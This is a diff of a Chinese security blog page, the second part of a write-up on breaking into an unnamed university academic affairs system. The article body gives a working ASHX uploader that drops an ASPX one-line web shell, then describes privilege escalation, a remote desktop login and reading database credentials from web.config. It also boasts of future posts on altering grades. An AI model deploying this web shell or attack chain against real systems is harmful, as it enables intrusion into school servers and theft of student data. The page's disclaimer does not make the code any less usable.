@@ -1,29 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://y00z.github.io">
   <title>某教务系统注入getshell提权一条龙(下) | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+  <meta name="description" content="前言 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！   正文 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta name="keywords" content="安全攻防">
 <meta property="og:type" content="article">
 <meta property="og:title" content="某教务系统注入getshell提权一条龙(下)">
 <meta property="og:url" content="http://y00z.github.io/2017/03/14/diary-2017-0314-02/index.html">
 <meta property="og:site_name" content="Yooz的博客">
-<meta property="og:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta property="og:description" content="前言 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！   正文 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-53.PNG">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-53.5.PNG">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-54.PNG">
@@ -38,18 +30,13 @@
 <meta property="og:updated_time" content="2017-05-22T16:25:39.696Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="某教务系统注入getshell提权一条龙(下)">
-<meta name="twitter:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
+<meta name="twitter:description" content="前言 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！   正文 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。">
 <meta name="twitter:image" content="http://y00z.github.io/images/pasted-53.PNG">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
   
-    <link rel="icon" href="http://oi6ni1o6u.bkt.clouddn.com/tx.png">
+    <link rel="icon" href="https://raw.githubusercontent.com/Y00z/Test/master/tx.jpg">
   
   <link rel="stylesheet" type="text/css" href="/./main.266c1c.css">
   <style type="text/css">
@@ -73,7 +60,7 @@ var _hmt = _hmt || [];
 
 
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -83,7 +70,7 @@ var _hmt = _hmt || [];
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="http://oi6ni1o6u.bkt.clouddn.com/tx.png" class="js-avatar">
+			<img src="https://raw.githubusercontent.com/Y00z/Test/master/tx.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">悠哉&#39;</a></h1>
@@ -137,7 +124,7 @@ var _hmt = _hmt || [];
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="http://oi6ni1o6u.bkt.clouddn.com/tx.png" class="js-avatar">
+				<img src="https://raw.githubusercontent.com/Y00z/Test/master/tx.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">悠哉&#39;</h1>
@@ -214,40 +201,40 @@ var _hmt = _hmt || [];
 <h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><blockquote>
 <p>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传</p>
 </blockquote>
-<p><img src="/images/pasted-53.PNG" alt=""></p>
-<p><img src="/images/pasted-53.5.PNG" alt=""></p>
+<p><img src="/images/pasted-53.PNG" alt></p>
+<p><img src="/images/pasted-53.5.PNG" alt></p>
 <blockquote>
 <p>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话</p>
 </blockquote>
-<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; </div><div class="line">using System; </div><div class="line">using System.Web; </div><div class="line">using System.IO; </div><div class="line">public class Handler : IHttpHandler &#123; </div><div class="line">    public void ProcessRequest (HttpContext context) &#123; </div><div class="line">        context.Response.ContentType = &quot;text/plain&quot;; </div><div class="line">        string show=&quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;; </div><div class="line">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); </div><div class="line">        file1.Write(show); </div><div class="line">        file1.Flush(); </div><div class="line">        file1.Close(); </div><div class="line">    &#125; </div><div class="line">    public bool IsReusable &#123; </div><div class="line">        get &#123; </div><div class="line">            return false; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; </span><br><span class="line">using System; </span><br><span class="line">using System.Web; </span><br><span class="line">using System.IO; </span><br><span class="line">public class Handler : IHttpHandler &#123; </span><br><span class="line">    public void ProcessRequest (HttpContext context) &#123; </span><br><span class="line">        context.Response.ContentType = &quot;text/plain&quot;; </span><br><span class="line">        string show=&quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;; </span><br><span class="line">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); </span><br><span class="line">        file1.Write(show); </span><br><span class="line">        file1.Flush(); </span><br><span class="line">        file1.Close(); </span><br><span class="line">    &#125; </span><br><span class="line">    public bool IsReusable &#123; </span><br><span class="line">        get &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>会上传在wbwj目录下</p>
-<p>访问<a href="http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码" target="_blank" rel="external">http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码</a> chopper</p>
-<p>一句话地址，<a href="http://***.***.com/wbwj/root.aspx" target="_blank" rel="external">http://***.***.com/wbwj/root.aspx</a>  连接之</p>
+<p>访问<a href="http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码" target="_blank" rel="noopener">http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码</a> chopper</p>
+<p>一句话地址，<a href="http://***.***.com/wbwj/root.aspx" target="_blank" rel="noopener">http://***.***.com/wbwj/root.aspx</a>  连接之</p>
 </blockquote>
-<p><img src="/images/pasted-54.PNG" alt=""></p>
+<p><img src="/images/pasted-54.PNG" alt></p>
 <blockquote>
 <p>看下权限,还是挺大的，</p>
 </blockquote>
-<p><img src="/images/pasted-55.PNG" alt=""></p>
-<p><img src="/images/pasted-56.PNG" alt=""></p>
-<p><img src="/images/pasted-57.PNG" alt=""></p>
+<p><img src="/images/pasted-55.PNG" alt></p>
+<p><img src="/images/pasted-56.PNG" alt></p>
+<p><img src="/images/pasted-57.PNG" alt></p>
 <blockquote>
 <p>直接上传神器提权之。</p>
 </blockquote>
-<p><img src="/images/pasted-58.PNG" alt=""></p>
+<p><img src="/images/pasted-58.PNG" alt></p>
 <blockquote>
 <p>3389端口没有改，直接连接。</p>
 </blockquote>
-<p><img src="/images/pasted-59.PNG" alt=""></p>
-<p><img src="/images/pasted-60.PNG" alt=""></p>
+<p><img src="/images/pasted-59.PNG" alt></p>
+<p><img src="/images/pasted-60.PNG" alt></p>
 <blockquote>
 <p>在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。</p>
 </blockquote>
-<p><img src="/images/pasted-61.PNG" alt=""></p>
+<p><img src="/images/pasted-61.PNG" alt></p>
 <blockquote>
 <p>在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码</p>
-<p><img src="/images/pasted-100.jpg" alt=""></p>
+<p><img src="/images/pasted-100.jpg" alt></p>
 </blockquote>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
 <p>这个是什么教务系统就不多说，用过的一看就知道。<br>有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。<br>后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>
@@ -269,13 +256,13 @@ var _hmt = _hmt || [];
                   <div class="reward-box">
                     
                     <div class="reward-box-item">
-                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/zhifubao1.jpg">
+                      <img class="reward-img" src="https://raw.githubusercontent.com/Y00z/Test/master/zhifubao.jpg">
                       <span class="reward-type">支付宝</span>
                     </div>
                     
                     
                     <div class="reward-box-item">
-                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/weixin1.jpg">
+                      <img class="reward-img" src="https://raw.githubusercontent.com/Y00z/Test/master/wenxin.jpg">
                       <span class="reward-type">微信</span>
                     </div>
                     
@@ -427,7 +414,7 @@ window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="tex
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 悠哉&#39;
+    		&copy; 2019 悠哉&#39;
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -502,15 +489,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">开源</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安卓</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -518,19 +497,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">安卓</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">安全攻防</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">小程序</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">反编译</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">React-Native</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">小程序</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -546,15 +529,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">路由器</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">React</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">路由器</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">wifi</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">nas</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">反编译</a>
               </li>
             
             <div class="clearfix"></div>
